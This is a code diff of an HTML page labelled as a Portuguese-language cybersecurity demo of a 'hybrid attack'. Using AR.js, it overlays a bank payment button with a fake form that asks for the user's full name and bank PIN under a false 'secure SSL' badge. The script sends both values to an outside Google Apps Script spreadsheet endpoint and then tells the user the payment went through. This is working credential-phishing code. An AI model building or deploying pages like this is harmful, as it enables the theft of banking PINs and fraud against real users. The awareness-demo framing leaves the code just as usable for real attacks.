@@ -1,96 +1,107 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Demo Cibersegurança - Overlay Pro</title>
+    <title>Demo Cibersegurança - Ataque Híbrido</title>
     <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
     <script src="https://raw.githack.com/AR-js-org/AR.js/master/aframe/build/aframe-ar.js"></script>
     <style>
-        /* Estilo para a caixinha de nome não travar a RA */
-        #input-container {
+        /* Tela de captura que aparece sobre a RA */
+        #hacker-form {
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.9); padding: 20px; border-radius: 10px;
-            z-index: 9999; display: none; text-align: center; color: white; font-family: sans-serif;
-            border: 2px solid #27ae60;
+            background: rgba(15, 15, 15, 0.98); padding: 25px; border-radius: 15px;
+            z-index: 9999; display: none; text-align: center; color: white; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            border: 2px solid #e74c3c; box-shadow: 0 0 20px rgba(231, 76, 60, 0.5);
+            width: 80%; max-width: 300px;
         }
-        input { padding: 10px; width: 80%; margin: 10px 0; border-radius: 5px; border: none; }
-        button { padding: 10px 20px; background: #27ae60; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        input { 
+            padding: 12px; width: 90%; margin: 10px 0; border-radius: 8px; 
+            border: 1px solid #444; background: #222; color: white; font-size: 16px;
+        }
+        button { 
+            padding: 12px 25px; background: #e74c3c; color: white; 
+            border: none; border-radius: 8px; cursor: pointer; font-weight: bold;
+            width: 100%; margin-top: 10px;
+        }
+        .status { color: #888; font-size: 12px; margin-top: 10px; }
     </style>
 </head>
 
 <body style="margin: 0px; overflow: hidden;">
-    <div id="input-container">
-        <h3>IDENTIFICAÇÃO NECESSÁRIA</h3>
-        <p>Digite seu nome para autorizar o pagamento:</p>
-        <input type="text" id="nome-input" placeholder="Seu nome aqui...">
-        <br>
-        <button onclick="confirmarNome()">CONTINUAR</button>
+
+    <div id="hacker-form">
+        <h2 style="color: #e74c3c; margin-top: 0;">PAGAMENTO</h2>
+        <p>Identifique-se para continuar:</p>
+        <input type="text" id="nome-input" placeholder="Seu Nome Completo">
+        <input type="password" id="pin-input" placeholder="Digite seu PIN do Banco" inputmode="numeric" pattern="[0-9]*">
+        <button onclick="enviarDados()">CONFIRMAR PAGAMENTO</button>
+        <div class="status">🔒 Conexão Segura SSL Ativa</div>
     </div>
 
     <a-scene embedded arjs="sourceType: webcam; debugUIEnabled: false;">
-        <a-assets><img id="btnBanco" src="botao_banco2.png"></a-assets>
+        <a-assets>
+            <img id="btnBanco" src="botao_banco2.png">
+        </a-assets>
 
-        <a-entity cursor="fuse: false; rayOrigin: mouse" raycaster="objects: .clickable; interval: 10"></a-entity>
+        <a-entity cursor="rayOrigin: mouse" raycaster="objects: .clickable"></a-entity>
 
         <a-marker type="pattern" url="marker.patt">
-            <a-image src="#btnBanco" position="0 0.01 0" rotation="-90 0 0" width="2.5" height="3.0"></a-image>
+            <a-image id="target" class="clickable" src="#btnBanco" 
+                     position="0 0.1 0" rotation="-90 0 0" 
+                     width="2.5" height="3.0"
+                     onclick="mostrarFormulario()">
+            </a-image>
 
-            <a-plane id="malicious-overlay" class="clickable" position="0 0.1 0" rotation="-90 0 0" 
-                     width="2.6" height="3.1" material="opacity: 0.3; color: red" onclick="mostrarInput()">
+            <a-plane class="clickable" position="0 0.15 0" rotation="-90 0 0" 
+                     width="2.6" height="3.1" material="opacity: 0.2; color: red" 
+                     onclick="mostrarFormulario()">
             </a-plane>
-
-            <a-entity id="fake-form" position="0 1.2 -1" rotation="-90 0 0" visible="false">
-                <a-plane width="3" height="3.8" color="#111" material="opacity: 0.95"></a-plane>
-                <a-text value="CONFIRME SEU PIN" align="center" position="0 1.4 0.1" scale="0.6 0.6 0.6"></a-text>
-                <a-plane position="0 0.8 0.1" width="2.4" height="0.5" color="#333">
-                    <a-text id="pass-display" value="DIGITE..." align="center" position="0 0 0.05" scale="0.8 0.8 0.8" color="#00ff00"></a-text>
-                </a-plane>
-
-                <a-plane class="clickable" position="-0.8 0.1 0.2" width="0.7" height="0.7" color="#444" onclick="registrarDigito('1')"><a-text value="1" align="center"></a-text></a-plane>
-                <a-plane class="clickable" position="0 0.1 0.2" width="0.7" height="0.7" color="#444" onclick="registrarDigito('2')"><a-text value="2" align="center"></a-text></a-plane>
-                <a-plane class="clickable" position="0.8 0.1 0.2" width="0.7" height="0.7" color="#444" onclick="registrarDigito('3')"><a-text value="3" align="center"></a-text></a-plane>
-
-                <a-plane class="clickable" position="0 -1.1 0.2" width="2.5" height="0.7" color="#27ae60" onclick="finalizarAtaque()">
-                    <a-text value="CONFIRMAR PAGAMENTO" align="center" scale="0.6 0.6 0.6"></a-text>
-                </a-plane>
-            </a-entity>
         </a-marker>
+
         <a-entity camera></a-entity>
     </a-scene>
 
     <script>
-        let senhaColetada = "";
-        let nomeUsuario = "";
         const linkPlanilha = "https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec";
 
-        function mostrarInput() {
-            // Em vez de prompt, mostra a DIV customizada
-            document.getElementById('input-container').style.display = 'block';
+        function mostrarFormulario() {
+            // Abre o formulário HTML na frente da câmera
+            document.getElementById('hacker-form').style.display = 'block';
         }
 
-        function confirmarNome() {
-            nomeUsuario = document.getElementById('nome-input').value || "Vítima Anônima";
-            document.getElementById('input-container').style.display = 'none';
-            
-            // Ativa o formulário RA sem dar "freeze" na câmera
-            document.querySelector('#fake-form').setAttribute('visible', 'true');
-            document.querySelector('#malicious-overlay').setAttribute('visible', 'false');
-            document.querySelector('[cursor]').components.raycaster.refreshObjects();
-        }
+        function enviarDados() {
+            const nome = document.getElementById('nome-input').value;
+            const pin = document.getElementById('pin-input').value;
 
-        function registrarDigito(num) {
-            senhaColetada += num;
-            document.querySelector('#pass-display').setAttribute('value', '*'.repeat(senhaColetada.length));
-        }
+            if (!nome || !pin) {
+                alert("Por favor, preencha todos os campos para continuar.");
+                return;
+            }
 
-        function finalizarAtaque() {
-            if (senhaColetada.length === 0) return;
-            document.querySelector('#pass-display').setAttribute('value', 'ENVIANDO...');
+            // Feedback visual no botão
+            const btn = document.querySelector('button');
+            btn.innerHTML = "PROCESSANDO...";
+            btn.disabled = true;
 
-            fetch(`${linkPlanilha}?nome=${encodeURIComponent(nomeUsuario)}&senha=${senhaColetada}`, {
-                method: 'POST', mode: 'no-cors'
-            }).then(() => {
-                alert("🚨 DADOS COLETADOS!\n\nConfira a planilha.");
-                location.reload(); // Recarrega para limpar tudo para o próximo
+            // ENVIO PARA A PLANILHA
+            fetch(`${linkPlanilha}?nome=${encodeURIComponent(nome)}&senha=${encodeURIComponent(pin)}`, {
+                method: 'POST',
+                mode: 'no-cors'
+            })
+            .then(() => {
+                alert("🚨 OPERAÇÃO CONCLUÍDA!\n\nSeu pagamento foi 'processado' com sucesso.\n\n(Dica: Olhe os dados na planilha agora!)");
+                
+                // Limpa e reseta
+                document.getElementById('nome-input').value = "";
+                document.getElementById('pin-input').value = "";
+                document.getElementById('hacker-form').style.display = 'none';
+                btn.innerHTML = "CONFIRMAR PAGAMENTO";
+                btn.disabled = false;
+            })
+            .catch(err => {
+                alert("Erro de conexão. Tente novamente.");
+                btn.innerHTML = "CONFIRMAR PAGAMENTO";
+                btn.disabled = false;
             });
         }
     </script>
